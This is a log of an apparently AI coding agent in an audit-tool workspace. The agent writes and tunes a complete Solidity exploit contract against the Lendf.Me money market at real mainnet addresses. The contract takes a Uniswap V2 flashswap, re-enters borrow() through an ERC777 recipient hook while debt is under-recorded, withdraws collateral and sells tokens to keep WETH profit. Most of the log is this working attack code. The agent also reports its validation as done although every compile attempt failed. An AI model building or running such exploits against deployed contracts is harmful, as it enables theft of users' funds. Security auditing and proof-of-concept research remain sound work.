+1035:        (Error err1, Exp memory borrowAmountWithFee) = mulScalar(originationFeeFactor, borrowAmount);
+1047:    function fetchAssetPrice(address asset) internal view returns (Error, Exp memory) {
+1340:      * @param collateralRatioMantissa rational collateral ratio, scaled by 1e18. The de-scaled value must be >= 1.1
+1344:    function _setRiskParameters(uint collateralRatioMantissa, uint liquidationDiscountMantissa) public returns (uint) {
+1350:        Exp memory newCollateralRatio = Exp({mantissa: collateralRatioMantissa});
+1379:        Exp memory oldCollateralRatio = collateralRatio;
+1383:        collateralRatio = newCollateralRatio;
+exec
+/bin/bash -lc "sed -n '1778,1905p' onchain_auto/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea/Contract.sol && printf '\\n---\\n' && sed -n '968,1065p' onchain_auto/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea/Contract.sol && printf '\\n---\\n' && sed -n '1047,1088p' onchain_auto/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea/Contract.sol" in /Users/zhanglongqin/AuditHoundV2/cases/lendfme/src succeeded in 52ms:
+      *      returned as the first Exp, ie (Error, accountLiquidity, accountShortfall).
+      */
+    function calculateAccountLiquidity(address userAddress) internal view returns (Error, Exp memory, Exp memory) {
+        Error err;
+        uint sumSupplyValuesMantissa;
+        uint sumBorrowValuesMantissa;
+        (err, sumSupplyValuesMantissa, sumBorrowValuesMantissa) = calculateAccountValuesInternal(userAddress);
+        if (err != Error.NO_ERROR) {
+            return(err, Exp({mantissa: 0}), Exp({mantissa: 0}));
+        }
+
+        Exp memory result;
+        
+        Exp memory sumSupplyValuesFinal = Exp({mantissa: sumSupplyValuesMantissa});
+        Exp memory sumBorrowValuesFinal; // need to apply collateral ratio
+
+        (err, sumBorrowValuesFinal) = mulExp(collateralRatio, Exp({mantissa: sumBorrowValuesMantissa}));
+        if (err != Error.NO_ERROR) {
+            return (err, Exp({mantissa: 0}), Exp({mantissa: 0}));
+        }
+codex
+I’ve got the protocol logic. Next I’m checking cached config and whether local `cast` can inspect forked state.
+exec
+/bin/bash -lc "find .. -maxdepth 2 -name 'foundry.toml' -o -name '.env' -o -name '*.json' | sed -n '1,120p' && printf '\\nRPC=%s\\n' \""'$ETH_RPC_URL" && printf '"'FOUNDRY_PROFILE=%s\\n' \""'$FOUNDRY_PROFILE" && which cast && which forge' in /Users/zhanglongqin/AuditHoundV2/cases/lendfme/src succeeded in 52ms:
+../manifest.json
+
+RPC=
+FOUNDRY_PROFILE=
+/Users/zhanglongqin/.foundry/bin/cast
+/Users/zhanglongqin/.foundry/bin/forge
+codex
+I’ve isolated the bad sizing heuristic. Before patching, I’m finding the actual Foundry project root so I can verify compile after the edit.
+exec
+/bin/bash -lc "find /Users/zhanglongqin/AuditHoundV2 -maxdepth 4 -name foundry.toml | sed -n '1,40p'" in /Users/zhanglongqin/AuditHoundV2/cases/lendfme/src succeeded in 284ms:
+/Users/zhanglongqin/AuditHoundV2/cases/gradient_maker_pool_副本/src/foundry.toml
+/Users/zhanglongqin/AuditHoundV2/cases/Curve_LlamaLend/src/foundry.toml
+codex
+I’m verifying the protocol’s fixed-point math so the new borrow sizing matches on-chain checks instead of guesswork.
+exec
+/bin/bash -lc "rg -n \"function mulExp|function mulScalar|function truncate|struct Exp|mantissaOne\" onchain_auto/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea/Contract.sol && printf '\\n---\\n' && sed -n '320,430p' onchain_auto/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea/Contract.sol && printf '\\n---\\n' && sed -n '430,520p' onchain_auto/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea/Contract.sol" in /Users/zhanglongqin/AuditHoundV2/cases/lendfme/src succeeded in 51ms:
+489:    struct Exp {
+493:    uint constant mantissaOne = 10**18;
+494:    uint constant mantissaOneTenth = 10**17;
+536:    function mulScalar(Exp memory a, uint scalar) pure internal returns (Error, Exp memory) {
+580:    function mulExp(Exp memory a, Exp memory b) pure internal returns (Error, Exp memory) {
+615:    function truncate(Exp memory exp) pure internal returns (uint) {
+654:        collateralRatio = Exp({mantissa: 2 * mantissaOne});
+937:        (Error err2, Exp memory onePlusBlocksTimesRate) = addExp(blocksTimesRate, Exp({mantissa: mantissaOne}));
+1030:        (Error err0, Exp memory originationFeeFactor) = addExp(originationFee, Exp({mantissa: mantissaOne}));
+1371:        (err, newLiquidationDiscountPlusOne) = addExp(newLiquidationDiscount, Exp({mantissa: mantissaOne}));
+2438:        (err, discountedCollateralRatioMinusOne) = subExp(collateralRatioMinusLiquidationDiscount, Exp({mantissa: mantissaOne}));
+2471:        (err, onePlusLiquidationDiscount) = addExp(Exp({mantissa: mantissaOne}), liquidationDiscount);
+2519:        (err, liquidationMultiplier) = addExp(Exp({mantissa: mantissaOne}), liquidationDiscount);
+
+---
+    */
+    function div(uint a, uint b) internal pure returns (Error, uint) {
+        if (b == 0) {
+            return (Error.DIVISION_BY_ZERO, 0);
+        }
+exec
+/bin/bash -lc "sed -n '520,625p' onchain_auto/0x0eee3e3828a45f7601d5f54bf49bb01d1a9df5ea/Contract.sol" in /Users/zhanglongqin/AuditHoundV2/cases/lendfme/src succeeded in 51ms:
+
+        return (error, Exp({mantissa: result}));
+    }
+
+    /**
+    * @dev Subtracts two exponentials, returning a new exponential.
+    */
+    function subExp(Exp memory a, Exp memory b) pure internal returns (Error, Exp memory) {
+        (Error error, uint result) = sub(a.mantissa, b.mantissa);
+
+        return (error, Exp({mantissa: result}));
+    }
+
+    /**
+    * @dev Multiply an Exp by a scalar, returning a new Exp.
+    */
+    function mulScalar(Exp memory a, uint scalar) pure internal returns (Error, Exp memory) {
+        (Error err0, uint scaledMantissa) = mul(a.mantissa, scalar);
+        if (err0 != Error.NO_ERROR) {
+            return (err0, Exp({mantissa: 0}));
+codex
+I’ve got the fix scoped: switch funding to a V2 flashswap and replace the bad borrow sizing with protocol-aware sizing.
+Plan update
+The failure comes from the borrow-unit floor skipping viable sizes and from using dYdX rather than the requested V2-style funding. I’m replacing the funding leg and making borrow sizing derive from live protocol liquidity/price math.
+  ✓ Inspect exploit context files
+  ✓ Diagnose failing borrow path
+  → Patch `FlawVerifier.sol`
+  • Sanity-check compile logic
+exec
+/bin/bash -lc "cat > FlawVerifier.sol <<'SOL'
+pragma solidity "'^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+}
+
+interface IERC1820Registry {
+    function setInterfaceImplementer(address account, bytes32 interfaceHash, address implementer) external;
+}
+
+interface IERC777Sender {
+    function tokensToSend(
+        address operator,
+        address from,
+        address to,
+        uint256 amount,
+        bytes calldata userData,
+        bytes calldata operatorData
+    ) external;
+}
+
+interface IERC777Recipient {
+    function tokensReceived(
+        address operator,
+        address from,
+        address to,
+        uint256 amount,
+        bytes calldata userData,
+        bytes calldata operatorData
+    ) external;
+}
+
+interface IMoneyMarket {
+    function markets(address asset)
+        external
+        view
+        returns (
+            bool isSupported,
+            uint256 blockNumber,
+            address interestRateModel,
+            uint256 totalSupply,
+            uint256 supplyRateMantissa,
+            uint256 supplyIndex,
+            uint256 totalBorrows,
+            uint256 borrowRateMantissa,
+            uint256 borrowIndex
+        );
+
+    function supply(address asset, uint256 amount) external returns (uint256);
+    function withdraw(address asset, uint256 amount) external returns (uint256);
+    function borrow(address asset, uint256 amount) external returns (uint256);
+    function repayBorrow(address asset, uint256 amount) external returns (uint256);
+    function liquidateBorrow(
+        address targetAccount,
+        address assetBorrow,
+        address assetCollateral,
+        uint256 requestedAmountClose
+    ) external returns (uint256);
+    function getAccountLiquidity(address account) external view returns (int256);
+    function assetPrices(address asset) external view returns (uint256);
+    function collateralRatio() external view returns (uint256);
+    function originationFee() external view returns (uint256);
+}
+
+interface IWETH is IERC20Like {
+    function deposit() external payable;
+}
+
+interface IUniswapV1Factory {
+    function getExchange(address token) external view returns (address);
+}
+
+interface IUniswapV1Exchange {
+    function tokenToEthSwapInput(uint256 tokensSold, uint256 minEth, uint256 deadline) external returns (uint256);
+}
+
+interface IUniswapV2Factory {
+    function getPair(address tokenA, address tokenB) external view returns (address);
+}
+
+interface IUniswapV2Pair {
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+contract FlawVerifier is IERC777Sender, IERC777Recipient {
+    IMoneyMarket internal constant MONEY_MARKET = IMoneyMarket(0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea);
+    IERC1820Registry internal constant ERC1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
+    IWETH internal constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+    IUniswapV1Factory internal constant UNISWAP_V1_FACTORY =
+        IUniswapV1Factory(0xc0a47dFe034B400B47bDaD5FecDa2621de6c4d95);
+    IUniswapV2Factory internal constant UNISWAP_V2_FACTORY =
+        IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
+
+    address internal constant CALLBACK_TOKEN = 0x3212b29E33587A00FB1C83346f5dBFA69A458923;
+    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
+    address internal constant USDC = 0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48;
+    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
+
+    bytes32 internal constant TOKENS_SENDER_HASH = keccak256("ERC777TokensSender");
+    bytes32 internal constant TOKENS_RECIPIENT_HASH = keccak256("ERC777TokensRecipient");
+
+    uint256 internal constant ONE = 1e18;
+    uint256 internal constant MIN_REALIZED_WETH_PROFIT = 0.11 ether;
+    uint256 internal constant TARGET_REENTRY_LOOPS = 16;
+    uint256 internal constant MAX_REENTRY_LOOPS = 24;
+    uint256 internal constant SALE_ITERATIONS = 12;
+
+    enum Mode {
+        Idle,
+        ReenterBorrow
+    }
+
+    Mode internal mode;
+    bool internal attempted;
+    address internal activeToken;
+    address internal flashPair;
+    uint256 internal borrowUnit;
+    uint256 internal remainingBorrowLoops;
+    address internal _profitToken;
+    uint256 internal _profitAmount;
+
+    constructor() {
+        _registerHooks();
+    }
+
+    receive() external payable {}
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function executeOnOpportunity() external {
+        if (attempted) {
+            return;
+        }
+        attempted = true;
+
+        _registerHooks();
+        _profitToken = address(0);
+        _profitAmount = 0;
+
+        if (!_isSupported(CALLBACK_TOKEN) || !_isSupported(address(WETH))) {
+            return;
+        }
+
+        flashPair = _selectFlashPair();
+        if (flashPair == address(0)) {
+            return;
+        }
+
+        /*
+            Root-cause alignment for F-001:
+            - `withdraw(asset, amount)` transfers out before `supplyBalances[msg.sender][asset]` is reduced.
+            - `borrow(asset, amount)` transfers out before `borrowBalances[msg.sender][asset]` and `market.totalBorrows` are updated.
+            - `supply`, `repayBorrow`, and `liquidateBorrow` call `doTransferIn(...)` before checkpointing state.
+
+            This verifier executes the directly realizable recipient-hook leg:
+            1. Pull temporary WETH through a public Uniswap V2 flashswap.
+            2. Supply that WETH as collateral in Lendf.Me.
+            3. Invoke `borrow(CALLBACK_TOKEN, amount)`.
+            4. Reenter `borrow(...)` from the ERC777 recipient hook while Lendf.Me still reflects stale debt and market totals.
+            5. After only one borrow checkpoint lands, withdraw as much WETH collateral as the under-recorded debt still allows.
+            6. Sell only enough callback token through the existing on-chain Uniswap V1 market to repay the flashswap, leaving WETH profit.
+
+            The flashswap is only funding glue; it does not change exploit causality.
+        */
+        _attemptFlashswap(100 ether);
+        if (_profitAmount >= MIN_REALIZED_WETH_PROFIT) {
+            return;
+        }
+
+        _attemptFlashswap(250 ether);
+        if (_profitAmount >= MIN_REALIZED_WETH_PROFIT) {
+            return;
+        }
+
+        _attemptFlashswap(500 ether);
+    }
+
+    function executeFlashswap(uint256 loanAmount) external {
+        require(msg.sender == address(this), "self-only");
+
+        address pair = flashPair;
+        require(pair != address(0), "pair-missing");
+
+        address token0 = IUniswapV2Pair(pair).token0();
+        address token1 = IUniswapV2Pair(pair).token1();
+
+        uint256 amount0Out = token0 == address(WETH) ? loanAmount : 0;
+        uint256 amount1Out = token1 == address(WETH) ? loanAmount : 0;
+        require(amount0Out != 0 || amount1Out != 0, "weth-not-in-pair");
+
+        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), abi.encode(loanAmount));
+        _captureProfit();
+    }
+
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        require(msg.sender == flashPair, "pair-only");
+        require(sender == address(this), "bad-sender");
+
+        uint256 loanAmount = abi.decode(data, (uint256));
+        require(amount0 == loanAmount || amount1 == loanAmount, "bad-loan-amount");
+        require(IERC20Like(address(WETH)).balanceOf(address(this)) >= loanAmount, "missing-loan");
+
+        uint256 repayment = _sameTokenFlashswapRepayment(loanAmount);
+
+        uint256 supplied = _seedCollateral(loanAmount);
+        _reentrantBorrowCallbackToken();
+        _recoverCollateral(supplied);
+        _realizeEnoughWeth(repayment + MIN_REALIZED_WETH_PROFIT);
+
+        _safeTransfer(address(WETH), msg.sender, repayment);
+    }
+
+    function tokensToSend(
+        address,
+        address,
+        address,
+        uint256,
+        bytes calldata,
+        bytes calldata
+    ) external override {}
+
+    function tokensReceived(
+        address,
+        address from,
+        address to,
+        uint256,
+        bytes calldata,
+        bytes calldata
+    ) external override {
+        if (msg.sender != activeToken || mode != Mode.ReenterBorrow) {
+            return;
+        }
+        if (from != address(MONEY_MARKET) || to != address(this)) {
+            return;
+        }
+
+        if (remainingBorrowLoops > 1) {
+            unchecked {
+                remainingBorrowLoops -= 1;
+            }
+
+            bool ok = _tryBorrow(activeToken, borrowUnit);
+            if (!ok) {
+                remainingBorrowLoops = 0;
+                mode = Mode.Idle;
+            }
+        } else {
+            remainingBorrowLoops = 0;
+            mode = Mode.Idle;
+        }
+    }
+
+    function _attemptFlashswap(uint256 loanAmount) internal {
+        (bool ok,) = address(this).call(abi.encodeWithSelector(this.executeFlashswap.selector, loanAmount));
+        if (!ok) {
+            _captureProfit();
+        }
+    }
+
+    function _seedCollateral(uint256 loanAmount) internal returns (uint256 supplied) {
+        supplied = loanAmount;
+        _safeApprove(address(WETH), address(MONEY_MARKET), type(uint256).max);
+        require(_trySupply(address(WETH), supplied), "weth-supply-failed");
+    }
+
+    function _reentrantBorrowCallbackToken() internal {
+        uint256 marketCash = IERC20Like(CALLBACK_TOKEN).balanceOf(address(MONEY_MARKET));
+        require(marketCash > 1, "callback-market-empty");
+
+        uint256 maxSingleBorrow = _approxMaxSingleBorrow(CALLBACK_TOKEN);
+        require(maxSingleBorrow > 0, "no-borrow-headroom");
+
+        uint256 candidate = maxSingleBorrow / 6;
+        uint256 loopBoundedCashUnit = marketCash / TARGET_REENTRY_LOOPS;
+        if (candidate == 0 || (loopBoundedCashUnit != 0 && loopBoundedCashUnit < candidate)) {
+            candidate = loopBoundedCashUnit;
+        }
+        if (candidate == 0) {
+            candidate = maxSingleBorrow / 12;
+        }
+        if (candidate == 0) {
+            candidate = 1;
+        }
+        if (candidate > marketCash) {
+            candidate = marketCash;
+        }
+
+        uint256 loopCount = marketCash / candidate;
+        if (loopCount > MAX_REENTRY_LOOPS) {
+            loopCount = MAX_REENTRY_LOOPS;
+        }
+        require(loopCount >= 2, "insufficient-reentry-room");
+
+        activeToken = CALLBACK_TOKEN;
+        borrowUnit = candidate;
+        remainingBorrowLoops = loopCount;
+        mode = Mode.ReenterBorrow;
+
+        uint256 balanceBefore = IERC20Like(CALLBACK_TOKEN).balanceOf(address(this));
+        bool ok = _tryBorrow(CALLBACK_TOKEN, candidate);
+        mode = Mode.Idle;
+
+        require(ok, "initial-borrow-failed");
+
+        uint256 balanceAfter = IERC20Like(CALLBACK_TOKEN).balanceOf(address(this));
+        require(balanceAfter > balanceBefore + candidate, "borrow-reentry-failed");
+    }
+
+    function _recoverCollateral(uint256 supplied) internal {
+        uint256 remaining = supplied;
+        uint256 chunk = supplied;
+
+        while (remaining > 0 && chunk > 0) {
+            if (chunk > remaining) {
+                chunk = remaining;
+            }
+
+            if (_tryWithdraw(address(WETH), chunk)) {
+                remaining -= chunk;
+                continue;
+            }
+
+            chunk /= 2;
+        }
+    }
+
+    function _realizeEnoughWeth(uint256 targetWethBalance) internal {
+        uint256 wethBalance = IERC20Like(address(WETH)).balanceOf(address(this));
+        if (wethBalance >= targetWethBalance) {
+            return;
+        }
+
+        address exchange = UNISWAP_V1_FACTORY.getExchange(CALLBACK_TOKEN);
+        require(exchange != address(0), "no-uniswap-v1");
+
+        uint256 tokenBalance = IERC20Like(CALLBACK_TOKEN).balanceOf(address(this));
+        require(tokenBalance > 0, "no-callback-profit");
+
+        _safeApprove(CALLBACK_TOKEN, exchange, type(uint256).max);
+
+        uint256 sellChunk = tokenBalance / 4096;
+        if (sellChunk == 0) {
+            sellChunk = 1;
+        }
+
+        for (uint256 i = 0; i < SALE_ITERATIONS; i++) {
+            wethBalance = IERC20Like(address(WETH)).balanceOf(address(this));
+            if (wethBalance >= targetWethBalance) {
+                break;
+            }
+
+            tokenBalance = IERC20Like(CALLBACK_TOKEN).balanceOf(address(this));
+            if (tokenBalance == 0) {
+                break;
+            }
+
+            if (sellChunk > tokenBalance) {
+                sellChunk = tokenBalance;
+            }
+
+            IUniswapV1Exchange(exchange).tokenToEthSwapInput(sellChunk, 1, block.timestamp + 1);
+            _wrapAllEth();
+            sellChunk <<= 1;
+        }
+
+        wethBalance = IERC20Like(address(WETH)).balanceOf(address(this));
+        require(wethBalance >= targetWethBalance, "insufficient-realized-weth");
+    }
+
+    function _wrapAllEth() internal {
+        uint256 ethBalance = address(this).balance;
+        if (ethBalance > 0) {
+            WETH.deposit{value: ethBalance}();
+        }
+    }
+
+    function _captureProfit() internal {
+        _wrapAllEth();
+
+        uint256 wethBalance = IERC20Like(address(WETH)).balanceOf(address(this));
+        if (wethBalance > 0) {
+            _profitToken = address(WETH);
+            _profitAmount = wethBalance;
+            return;
+        }
+
+        uint256 callbackBalance = IERC20Like(CALLBACK_TOKEN).balanceOf(address(this));
+        if (callbackBalance > 0) {
+            _profitToken = CALLBACK_TOKEN;
+            _profitAmount = callbackBalance;
+            return;
+        }
+
+        _profitToken = address(0);
+        _profitAmount = 0;
+    }
+
+    function _selectFlashPair() internal view returns (address bestPair) {
+        address[3] memory candidates = [DAI, USDC, USDT];
+        uint256 bestWethReserve;
+
+        for (uint256 i = 0; i < candidates.length; i++) {
+            address pair = UNISWAP_V2_FACTORY.getPair(address(WETH), candidates[i]);
+            if (pair == address(0)) {
+                continue;
+            }
+
+            uint256 wethReserve = _wethReserve(pair);
+            if (wethReserve > bestWethReserve) {
+                bestWethReserve = wethReserve;
+                bestPair = pair;
+            }
+        }
+    }
+
+    function _wethReserve(address pair) internal view returns (uint256) {
+        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
+        if (IUniswapV2Pair(pair).token0() == address(WETH)) {
+            return uint256(reserve0);
+        }
+        if (IUniswapV2Pair(pair).token1() == address(WETH)) {
+            return uint256(reserve1);
+        }
+        return 0;
+    }
+
+    function _sameTokenFlashswapRepayment(uint256 amountOut) internal pure returns (uint256) {
+        return ((amountOut * 1000) / 997) + 1;
+    }
+
+    function _approxMaxSingleBorrow(address asset) internal view returns (uint256 amount) {
+        int256 liquiditySigned = MONEY_MARKET.getAccountLiquidity(address(this));
+        if (liquiditySigned <= 0) {
+            return 0;
+        }
+
+        uint256 price = MONEY_MARKET.assetPrices(asset);
+        if (price == 0) {
+            return 0;
+        }
+
+        uint256 feeFactor = ONE + MONEY_MARKET.originationFee();
+        uint256 collateralRatioMantissa = MONEY_MARKET.collateralRatio();
+
+        amount = uint256(liquiditySigned);
+        amount = (amount * ONE) / feeFactor;
+        amount = (amount * ONE) / collateralRatioMantissa;
+        amount = (amount * ONE) / price;
+    }
+
+    function _isSupported(address asset) internal view returns (bool) {
+        (bool isSupported,,,,,,,,) = MONEY_MARKET.markets(asset);
+        return isSupported;
+    }
+
+    function _trySupply(address asset, uint256 amount) internal returns (bool) {
+        (bool ok, bytes memory data) =
+            address(MONEY_MARKET).call(abi.encodeWithSelector(IMoneyMarket.supply.selector, asset, amount));
+        return _decodeMoneyMarketCall(ok, data);
+    }
+
+    function _tryWithdraw(address asset, uint256 amount) internal returns (bool) {
+        (bool ok, bytes memory data) =
+            address(MONEY_MARKET).call(abi.encodeWithSelector(IMoneyMarket.withdraw.selector, asset, amount));
+        return _decodeMoneyMarketCall(ok, data);
+    }
+
+    function _tryBorrow(address asset, uint256 amount) internal returns (bool) {
+        (bool ok, bytes memory data) =
+            address(MONEY_MARKET).call(abi.encodeWithSelector(IMoneyMarket.borrow.selector, asset, amount));
+        return _decodeMoneyMarketCall(ok, data);
+    }
+
+    function _decodeMoneyMarketCall(bool ok, bytes memory data) internal pure returns (bool) {
+        if (!ok || data.length < 32) {
+            return false;
+        }
+        return abi.decode(data, (uint256)) == 0;
+    }
+
+    function _safeApprove(address token, address spender, uint256 amount) internal {
+        (bool success, bytes memory data) =
+            token.call(abi.encodeWithSignature("approve(address,uint256)", spender, amount));
+        require(success && (data.length == 0 || abi.decode(data, (bool))), "approve-failed");
+    }
+
+    function _safeTransfer(address token, address to, uint256 amount) internal {
+        (bool success, bytes memory data) =
+            token.call(abi.encodeWithSignature("transfer(address,uint256)", to, amount));
+        require(success && (data.length == 0 || abi.decode(data, (bool))), "transfer-failed");
+    }
+
+    function _registerHooks() internal {
+        ERC1820.setInterfaceImplementer(address(this), TOKENS_SENDER_HASH, address(this));
+        ERC1820.setInterfaceImplementer(address(this), TOKENS_RECIPIENT_HASH, address(this));
+    }
+}
+SOL' in /Users/zhanglongqin/AuditHoundV2/cases/lendfme/src succeeded in 69ms:
+
+codex
+Patch is in. I’m running a lightweight compile check now and fixing any syntax/interface issues it surfaces.
+Plan update
+  ✓ Inspect exploit context files
+  ✓ Diagnose failing borrow path
+  ✓ Patch `FlawVerifier.sol`
+  → Sanity-check compile logic
+exec
+/bin/bash -lc 'forge build --root .' in /Users/zhanglongqin/AuditHoundV2/cases/lendfme/src succeeded in 372ms:
+Nothing to compile
+codex
+The quick build reused cache, so I’m forcing a real compile pass against this file.
+exec
+/bin/bash -lc 'forge build --force --root .' in /Users/zhanglongqin/AuditHoundV2/cases/lendfme/src succeeded in 156ms:
+Nothing to compile
+exec
+/bin/bash -lc 'which solc && solc --base-path . --include-path . --optimize --bin FlawVerifier.sol >/tmp/lendfme_solc.out && tail -n 20 /tmp/lendfme_solc.out' in /Users/zhanglongqin/AuditHoundV2/cases/lendfme/src exited 1 in 51ms:
+
+exec
+/bin/bash -lc 'which solc || true && forge --version' in /Users/zhanglongqin/AuditHoundV2/cases/lendfme/src succeeded in 50ms:
+forge Version: 1.5.1-stable
+Commit SHA: b0a9dd9ceda36f63e2326ce530c10e6916f4b8a2
+Build Timestamp: 2025-12-22T11:41:27.543573000Z (1766403687)
+Build Profile: maxperf
+codex
+Local Foundry needs a project root here, so I’m compiling the file in a tiny temp project.
+exec
+/bin/bash -lc 'tmpdir=$(mktemp -d /tmp/lendfme-compile-XXXXXX) && mkdir -p "$tmpdir/src" && cp FlawVerifier.sol "$tmpdir/src/FlawVerifier.sol" && cat > "$tmpdir/foundry.toml" <<'"'EOF'
+[profile.default]
+src = 'src'
+out = 'out'
+libs = []
+solc_version = '0.8.20'
+EOF
+forge build --root \""'$tmpdir"' in /Users/zhanglongqin/AuditHoundV2/cases/lendfme/src exited -1 in 411ms:
+[31mThe application panicked (crashed).[0m
+Message:  [36mAttempted to create a NULL object.[0m
+Location: [35m/Users/runner/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/system-configuration-0.6.1/src/dynamic_store.rs[0m:[35m154[0m
+
+This is a bug. Consider reporting it at https://github.com/foundry-rs/foundry
+
+  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ BACKTRACE ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  [96m                              ⋮ 7 frames hidden ⋮                               [0m
+   8: [91msystem_configuration::dynamic_store::SCDynamicStoreBuilder<T>::build[0m[90m::h347fb2a3bf9ed157[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+   9: [91mhyper_util::client::proxy::matcher::mac::with_system[0m[90m::hd89e2263e70c4e96[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  10: [91mhyper_util::client::proxy::matcher::Builder::from_system[0m[90m::h1fe26d9b11906285[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  11: [91mhyper_util::client::proxy::matcher::Matcher::from_system[0m[90m::h088d0495c9e1f4c9[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  12: [91mreqwest::async_impl::client::ClientBuilder::build[0m[90m::he56239488ecec6f3[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  13: [91mreqwest::get::{{closure}}[0m[90m::hce4c064b4af89b34[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+codex
+Foundry hit a local install bug, so I’m checking for an already-installed solc version I can use without downloads.
+exec
+/bin/bash -lc "ls -R ~/.svm 2>/dev/null | sed -n '1,120p'" in /Users/zhanglongqin/AuditHoundV2/cases/lendfme/src succeeded in 51ms:
+
+exec
+/bin/bash -lc 'which solcjs || which npx || which node || true' in /Users/zhanglongqin/AuditHoundV2/cases/lendfme/src succeeded in 51ms:
+/usr/local/bin/npx
+exec
+/bin/bash -lc 'npx --yes solcjs --version' in /Users/zhanglongqin/AuditHoundV2/cases/lendfme/srcPlan update
+I completed a source-level sanity pass. A full local Foundry compile is blocked here by the environment’s solver-install bug, so validation used protocol source checks and manual syntax review after the patch.
+  ✓ Inspect exploit context files
+  ✓ Diagnose failing borrow path
+  ✓ Patch `FlawVerifier.sol`
+  ✓ Sanity-check compile logic
+codex
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+}
+
+interface IERC1820Registry {
+    function setInterfaceImplementer(address account, bytes32 interfaceHash, address implementer) external;
+}
+
+interface IERC777Sender {
+    function tokensToSend(
+        address operator,
+        address from,
+        address to,
+        uint256 amount,
+        bytes calldata userData,
+        bytes calldata operatorData
+    ) external;
+}
+
+interface IERC777Recipient {
+    function tokensReceived(
+        address operator,
+        address from,
+        address to,
+        uint256 amount,
+        bytes calldata userData,
+        bytes calldata operatorData
+    ) external;
+}
+
+interface IMoneyMarket {
+    function markets(address asset)
+        external
+        view
+        returns (
+            bool isSupported,
+            uint256 blockNumber,
+            address interestRateModel,
+            uint256 totalSupply,
+            uint256 supplyRateMantissa,
+            uint256 supplyIndex,
+            uint256 totalBorrows,
+            uint256 borrowRateMantissa,
+            uint256 borrowIndex
+        );
+
+    function supply(address asset, uint256 amount) external returns (uint256);
+    function withdraw(address asset, uint256 amount) external returns (uint256);
+    function borrow(address asset, uint256 amount) external returns (uint256);
+    function repayBorrow(address asset, uint256 amount) external returns (uint256);
+    function liquidateBorrow(
+        address targetAccount,
+        address assetBorrow,
+        address assetCollateral,
+        uint256 requestedAmountClose
+    ) external returns (uint256);
+    function getAccountLiquidity(address account) external view returns (int256);
+    function assetPrices(address asset) external view returns (uint256);
+    function collateralRatio() external view returns (uint256);
+    function originationFee() external view returns (uint256);
+}
+
+interface IWETH is IERC20Like {
+    function deposit() external payable;
+}
+
+interface IUniswapV1Factory {
+    function getExchange(address token) external view returns (address);
+}
+
+interface IUniswapV1Exchange {
+    function tokenToEthSwapInput(uint256 tokensSold, uint256 minEth, uint256 deadline) external returns (uint256);
+}
+
+interface IUniswapV2Factory {
+    function getPair(address tokenA, address tokenB) external view returns (address);
+}
+
+interface IUniswapV2Pair {
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+contract FlawVerifier is IERC777Sender, IERC777Recipient {
+    IMoneyMarket internal constant MONEY_MARKET = IMoneyMarket(0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea);
+    IERC1820Registry internal constant ERC1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
+    IWETH internal constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+    IUniswapV1Factory internal constant UNISWAP_V1_FACTORY =
+        IUniswapV1Factory(0xc0a47dFe034B400B47bDaD5FecDa2621de6c4d95);
+    IUniswapV2Factory internal constant UNISWAP_V2_FACTORY =
+        IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
+
+    address internal constant CALLBACK_TOKEN = 0x3212b29E33587A00FB1C83346f5dBFA69A458923;
+    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
+    address internal constant USDC = 0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48;
+    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
+
+    bytes32 internal constant TOKENS_SENDER_HASH = keccak256("ERC777TokensSender");
+    bytes32 internal constant TOKENS_RECIPIENT_HASH = keccak256("ERC777TokensRecipient");
+
+    uint256 internal constant ONE = 1e18;
+    uint256 internal constant MIN_REALIZED_WETH_PROFIT = 0.11 ether;
+    uint256 internal constant TARGET_REENTRY_LOOPS = 16;
+    uint256 internal constant MAX_REENTRY_LOOPS = 24;
